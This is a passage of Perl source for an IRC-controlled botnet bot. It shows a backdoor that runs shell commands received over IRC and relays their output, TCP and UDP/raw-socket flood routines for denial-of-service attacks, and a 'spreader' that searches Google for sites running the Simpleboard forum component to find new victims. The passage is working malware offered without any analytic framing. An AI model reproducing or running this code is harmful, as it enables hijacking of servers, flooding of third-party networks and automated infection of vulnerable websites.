  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}

sub udpflooder {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65000; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {
  sendraw("PART $_[0]");
}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
}

# Spreader
# this 'spreader' code isnot mine, i dont know who coded it.
# update: well, i just fix0red this shit a bit.
#

sub fetch(){
    my $rnd=(int(rand(9999)));
    my $n= 80;
    if ($rnd<5000) { $n<<=1;}
    my $s= (int(rand(10)) * $n);

my @dominios = ("com","net","org","info","gov", "gob","gub","xxx", "eu","mil","edu","aero","name","us","ca","mx","pa","ni","cu","pr","ve","co","pe","ec",
		"py","cl","uy","ar","br","bo","au","nz","cz","kr","jp","th","tw","ph","cn","fi","de","es","pt","ch","se","su","it","gr","al","dk","pl","biz","int","pro","museum","coop",
		"af","ad","ao","ai","aq","ag","an","sa","dz","ar","am","aw","at","az","bs","bh","bd","bb","be","bz","bj","bm","bt","by","ba","bw","bn","bg","bf","bi",
		"vc","kh","cm","td","cs","cy","km","cg","cd","dj","dm","ci","cr","hr","kp","eg","sv","aw","er","sk",
		"ee","et","ge","fi","fr","ga","gs","gh","gi","gb","uk","gd","gl","gp","gu","gt","gg","gn","gw","gq","gy","gf","ht","nl","hn","hk","hu","in","id","ir",
		"iq","ie","is","ac","bv","cx","im","nf","ky","cc","ck","fo","hm","fk","mp","mh","pw","um","sb","sj","tc","vg","vi","wf","il","jm","je","jo","kz","ke",
		"ki","kg","kw","lv","ls","lb","ly","lr","li","lt","lu","mo","mk","mg","my","mw","mv","ml","mt","mq","ma","mr","mu","yt","md","mc","mn","ms","mz","mm",
		"na","nr","np","ni","ne","ng","nu","no","nc","om","pk","ps","pg","pn","pf","qa","sy","cf","la","re","rw","ro","ru","eh","kn","ws","as","sm","pm","vc",
		"sh","lc","va","st","sn","sc","sl","sg","so","lk","za","sd","se","sr","sz","rj","tz","io","tf","tp","tg","to","tt","tn","tr","tm","tv","ug","ua","uz",
		"vu","vn","ye","yu","cd","zm","zw","");
my @str;

foreach $dom  (@dominios)
{
	push (@str,"Simpleboard%2BForum%2BComponent+site%3A".$dom."%20");
}

    my $query="www.google.com/search?q=";
    $query.=$str[(rand(scalar(@str)))];
    $query.="&num=$n&start=$s";
    my @lst=();
    my $page = http_query($query);
    while ($page =~  m/<a class=l href=\"?http:\/\/([^>\"]+)\"?>/g){
	if ($1 !~ m/google|cache|translate/){
	    push (@lst,$1);
	}
    }
    return (@lst);
}

sub http_query($){
    my ($url) = @_;
    my $host=$url;
    my $query=$url;
    my $page="";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~s/$host//;
    if ($query eq "") {$query="/";};
    eval {
	local $SIG{ALRM} = sub { die "1";};
	alarm 10;
	my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
	print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
	my @r = <$sock>;
	$page="@r";
	alarm 0;
	close($sock);
    };
    return $page;

}
